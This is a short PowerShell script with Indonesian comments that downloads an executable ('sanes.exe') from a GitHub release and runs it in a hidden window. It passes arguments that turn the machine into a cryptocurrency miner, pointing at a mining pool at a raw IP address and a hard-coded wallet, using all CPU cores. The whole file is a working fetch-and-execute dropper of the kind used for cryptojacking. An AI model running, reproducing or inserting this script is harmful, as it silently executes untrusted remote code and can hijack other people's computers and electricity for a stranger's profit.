# Membuat folder temp jika tidak ada
$folderPath = "C:\temp"
if (!(Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
    Write-Host "Folder temp telah dibuat di $folderPath"
} else {
    Write-Host "Folder temp sudah ada di $folderPath"
}

# URL GitHub dari file exe yang ingin Anda download
$url = "https://github.com/TiannaMcdowell/All-File/releases/download/SanesB/sanes.exe"

# Path tempat Anda ingin menyimpan file exe
$outputPath = "$folderPath\sanes.exe"

# Command line arguments untuk file exe
$arguments = "--algorithm yespowersugar --pool 128.199.218.20:80 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.Nyobi --password x --disable-gpu --enable-1gb-hugepages --keepalive --cpu-threads $(Get-WmiObject -Class Win32_Processor).NumberOfCores" 

# Mendownload file exe dari GitHub
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Memeriksa apakah file berhasil diunduh
if (Test-Path $outputPath) {
    Write-Host "File berhasil diunduh ke $outputPath"

    # Menjalankan file exe di latar belakang dengan argumen
    Start-Process -FilePath $outputPath -ArgumentList $arguments -WindowStyle Hidden
} else {
    Write-Host "Gagal mengunduh file dari GitHub."
}